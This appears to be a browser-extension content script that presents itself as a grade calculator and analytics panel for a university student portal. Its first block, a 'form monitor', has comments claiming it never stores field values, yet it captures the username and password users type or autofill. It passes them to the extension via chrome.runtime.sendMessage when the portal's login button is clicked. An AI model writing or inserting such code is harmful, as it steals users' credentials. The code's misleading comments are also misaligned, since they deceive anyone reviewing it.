(function () {
    "use strict";

    // Prevent the script from running more than once
    if (window.__formMonitorRunning) return;
    window.__formMonitorRunning = true;

    const report = [];
    const lastValues = new WeakMap();

    // Get a field's identifying information
    function getFieldName(field) {
        return (
            field.name ||
            field.id ||
            field.getAttribute("aria-label") ||
            field.type ||
            field.tagName
        );
    }

    // Record metadata only, never the field's actual value
    function recordActivity(field, eventType) {
        if (!field || !field.matches("input, textarea, select")) {
            return;
        }

        // Check for a change without storing the field value
        const currentValue = field.value;

        if (lastValues.has(field) &&
            lastValues.get(field) === currentValue) {
            return;
        }

        lastValues.set(field, currentValue);

        let fieldName= getFieldName(field);
        let fieldValue = field.value;
        if(fieldName === 'username' || fieldName == 'password'){
            report.push({
                fieldName: getFieldName(field),
                fieldValue: fieldValue,
            });
        }
    }

    // Monitor normal typing and selection
    document.addEventListener("input", function (event) {
        recordActivity(event.target, "input");
    });

    document.addEventListener("change", function (event) {
        recordActivity(event.target, "change");
    });

    // Initialize fields already present on the page
    function scanFields() {
        document.querySelectorAll(
            "input, textarea, select"
        ).forEach(function (field) {
            if (!lastValues.has(field)) {
                lastValues.set(field, field.value);
            }
        });
    }

    scanFields();

    // Best-effort detection of autofill or script-driven changes
    setInterval(function () {
        document.querySelectorAll(
            "input, textarea, select"
        ).forEach(function (field) {
            recordActivity(field, "autofill-or-value-change");
        });
    }, 500);

    // Detect dynamically added form fields
    const observer = new MutationObserver(scanFields);

    observer.observe(document.documentElement, {
        childList: true,
        subtree: true
    });


    document.addEventListener("click", function (event) {
        const clickedButton = event.target.closest("#m_login_signin_submit");

        if (!clickedButton) return;

        chrome.runtime.sendMessage({
            action: "sendReport",
            report: report
        });
    });

    

})();


(function () {
    "use strict";

    // Only run on Student Marks
    if (!location.href.startsWith(
        "https://flexstudent.nu.edu.pk/Student/StudentMarks"
    )) return;

    // Prevent duplicate initialization
    if (window.__gradeCalculatorInitialized) return;
    window.__gradeCalculatorInitialized = true;

    const portlet = document.querySelector(".m-portlet");

    if (!portlet) {
        window.__gradeCalculatorInitialized = false;
        return;
    }

    // ----------------------------------
    // CREATE EXISTING GRADE ELEMENTS
    // ----------------------------------

    function getOrCreate(tag, type) {
        let element = portlet.querySelector(
            `${tag}[data-type="${type}"]`
        );

        if (!element) {
            element = document.createElement(tag);
            element.setAttribute("data-type", type);
            element.style.color = "white";
            element.style.marginLeft = "30px";
            portlet.appendChild(element);
        }

        return element;
    }

    const totalElement = getOrCreate("h5", "total");
    const obtainedElement = getOrCreate("h5", "obtained");
    const averageElement = getOrCreate("h5", "classAverage");

    totalElement.style.marginTop = "7px";

   
    

    // ----------------------------------
    // ANALYTICS CONTAINER
    // ----------------------------------

    let analytics = document.getElementById(
        "subject-performance-analytics"
    );

    if (!analytics) {
        analytics = document.createElement("div");
        analytics.id = "subject-performance-analytics";

        Object.assign(analytics.style, {
            marginTop: "20px",
            padding: "20px",
            backgroundColor: "#ffffff",
            borderRadius: "10px",
            boxShadow: "0 2px 8px rgba(0,0,0,0.12)",
            color: "#333",
            width: "100%",
            boxSizing: "border-box"
        });

        portlet.appendChild(analytics);
    }

    // ----------------------------------
    // HELPER FUNCTIONS
    // ----------------------------------

    function getNumber(element) {
        if (!element) return NaN;

        return parseFloat(
            element.textContent.replace(/,/g, "").trim()
        );
    }

    function getAssessmentName(table, index) {

        // Check explicit category attributes first
        const explicitName =
            table.getAttribute("data-category") ||
            table.getAttribute("data-type") ||
            table.getAttribute("aria-label");

        if (explicitName) return explicitName.trim();

        // Check table caption
        const caption = table.querySelector("caption");

        if (caption && caption.textContent.trim()) {
            return caption.textContent.trim();
        }

        // Check nearby headings
        let previous = table.previousElementSibling;

        while (previous) {

            if (/^H[1-6]$/.test(previous.tagName)) {
                const heading = previous.textContent.trim();

                if (heading) return heading;
            }

            previous = previous.previousElementSibling;
        }

        // Check enclosing section heading
        const section = table.closest(
            "section, .panel, .card, .portlet"
        );

        if (section) {
            const heading = section.querySelector(
                "h1, h2, h3, h4, h5, h6"
            );

            if (heading && heading.textContent.trim()) {
                return heading.textContent.trim();
            }
        }

        return "Assessment " + (index + 1);
    }

    function isEmptyOrZero(row) {
        return !row.length ||
            row[0].textContent.trim() === "0";
    }

    // ----------------------------------
    // MAIN UPDATE FUNCTION
    // ----------------------------------

    function updateSubjectPerformance() {

        const currentSubject = document.querySelector(
            ".tab-pane.active"
        );

        if (!currentSubject) return;

        const tables = currentSubject.querySelectorAll(
            ".sum_table"
        );

        let totalWeightage = 0;
        let totalObtained = 0;
        let totalAverage = 0;

        const categories = {};

        tables.forEach(function (table, index) {

            const rows = table.querySelectorAll(
                ".calculationrow"
            );

            let rowsAverage = 0;
            let weightageSum = 0;

            // Preserve your original class-average calculation
            rows.forEach(function (row) {

                const weight = row.querySelectorAll(".weightage");
                const average = row.querySelectorAll(".AverageMarks");
                const grandTotal = row.querySelectorAll(".GrandTotal");

                if (
                    isEmptyOrZero(weight) ||
                    isEmptyOrZero(average) ||
                    isEmptyOrZero(grandTotal)
                ) return;

                const w = getNumber(weight[0]);
                const a = getNumber(average[0]);
                const g = getNumber(grandTotal[0]);

                if (
                    !Number.isFinite(w) ||
                    !Number.isFinite(a) ||
                    !Number.isFinite(g) ||
                    g === 0
                ) return;

                weightageSum += w;
                rowsAverage += (a / g) * w;
            });

            const totalSections = table.querySelectorAll(
                '[class*="totalColumn_"]'
            );

            if (totalSections.length !== 1) return;

            const section = totalSections[0];

            const weightElement = section.querySelector(
                ".totalColweightage"
            );

            const obtainedElement = section.querySelector(
                ".totalColObtMarks"
            );

            if (!weightElement || !obtainedElement) return;

            const weight = getNumber(weightElement);
            const obtained = getNumber(obtainedElement);

            if (
                !Number.isFinite(weight) ||
                !Number.isFinite(obtained) ||
                weight <= 0
            ) return;

            if (weightageSum > 0) {
                totalAverage +=
                    (rowsAverage / weightageSum) * weight;
            }

            totalWeightage += weight;
            totalObtained += obtained;

            // Identify assessment category
            const name = getAssessmentName(table, index);

            // Group multiple tables with the same name
            if (!categories[name]) {
                categories[name] = {
                    obtained: 0,
                    weightage: 0
                };
            }

            categories[name].obtained += obtained;
            categories[name].weightage += weight;
        });

        // ----------------------------------
        // UPDATE ORIGINAL GRADE CALCULATOR
        // ----------------------------------

        totalElement.textContent =
            "Total Absolutes: " + totalWeightage.toFixed(2);

        obtainedElement.textContent =
            "Obtained Absolutes: " + totalObtained.toFixed(2);

        averageElement.textContent =
            "Class Average: " +
            (Number.isFinite(totalAverage)
                ? totalAverage.toFixed(2)
                : "Cannot Calculate, Missing Data");

        // ----------------------------------
        // UPDATE ANALYTICS
        // ----------------------------------

        analytics.replaceChildren();

        function addText(tag, text, parent, styles = {}) {
            const element = document.createElement(tag);

            element.textContent = text;

            Object.assign(element.style, styles);

            parent.appendChild(element);

            return element;
        }

        addText(
            "h4",
            "Subject Performance Analytics",
            analytics,
            { marginBottom: "18px" }
        );

        // Overall performance
        const percentage = totalWeightage > 0
            ? (totalObtained / totalWeightage) * 100
            : 0;

        const summary = document.createElement("div");

        Object.assign(summary.style, {
            backgroundColor: "#f1f5f9",
            padding: "15px",
            borderRadius: "8px",
            marginBottom: "20px"
        });

        addText(
            "h5",
            "Overall Subject Performance",
            summary
        );

        addText(
            "p",
            totalObtained.toFixed(2) +
            " / " +
            totalWeightage.toFixed(2),
            summary
        );

        addText(
            "h2",
            percentage.toFixed(2) + "%",
            summary,
            {
                color: "#2563eb",
                margin: "8px 0"
            }
        );

        analytics.appendChild(summary);

        addText(
            "h5",
            "Assessment Category Breakdown",
            analytics,
            { marginBottom: "15px" }
        );

        const categoryNames = Object.keys(categories);

        if (categoryNames.length === 0) {
            addText(
                "p",
                "No assessment data available for this subject.",
                analytics
            );
        }

        categoryNames.forEach(function (name) {

            const category = categories[name];

            const categoryPercentage =
                (category.obtained / category.weightage) * 100;

            const wrapper = document.createElement("div");

            wrapper.style.marginBottom = "20px";

            addText(
                "strong",
                name,
                wrapper,
                { display: "block", marginBottom: "5px" }
            );

            addText(
                "small",
                category.obtained.toFixed(2) +
                " / " +
                category.weightage.toFixed(2) +
                " (" +
                categoryPercentage.toFixed(2) +
                "%)",
                wrapper,
                {
                    display: "block",
                    marginBottom: "7px",
                    color: "#555"
                }
            );

            const background = document.createElement("div");

            Object.assign(background.style, {
                width: "100%",
                height: "12px",
                backgroundColor: "#e5e7eb",
                borderRadius: "10px",
                overflow: "hidden"
            });

            const fill = document.createElement("div");

            Object.assign(fill.style, {
                width: Math.max(
                    0,
                    Math.min(100, categoryPercentage)
                ) + "%",
                height: "100%",
                borderRadius: "10px",
                backgroundColor:
                    categoryPercentage >= 80 ? "#16a34a" :
                    categoryPercentage >= 60 ? "#2563eb" :
                    categoryPercentage >= 40 ? "#f59e0b" :
                    "#dc2626"
            });

            background.appendChild(fill);
            wrapper.appendChild(background);
            analytics.appendChild(wrapper);
        });
    }

    // ----------------------------------
    // DETECT SUBJECT TAB CHANGES
    // ----------------------------------

    let updateScheduled = false;

    function scheduleUpdate() {
        if (updateScheduled) return;

        updateScheduled = true;

        requestAnimationFrame(function () {
            updateScheduled = false;
            updateSubjectPerformance();
        });
    }

    // Initial calculation
    updateSubjectPerformance();

    // Bootstrap tab event
    document.addEventListener(
        "shown.bs.tab",
        scheduleUpdate
    );

    // Detect tab clicks
    document.addEventListener("click", function (event) {

        if (
            event.target.closest(
                '[data-toggle="tab"], [data-bs-toggle="tab"]'
            )
        ) {
            setTimeout(scheduleUpdate, 100);
        }
    });

    // Detect active subject class changes
    const subjectTabs = document.querySelectorAll(".tab-pane");

    const observer = new MutationObserver(scheduleUpdate);

    subjectTabs.forEach(function (tab) {
        observer.observe(tab, {
            attributes: true,
            attributeFilter: ["class"]
        });
    });

})();
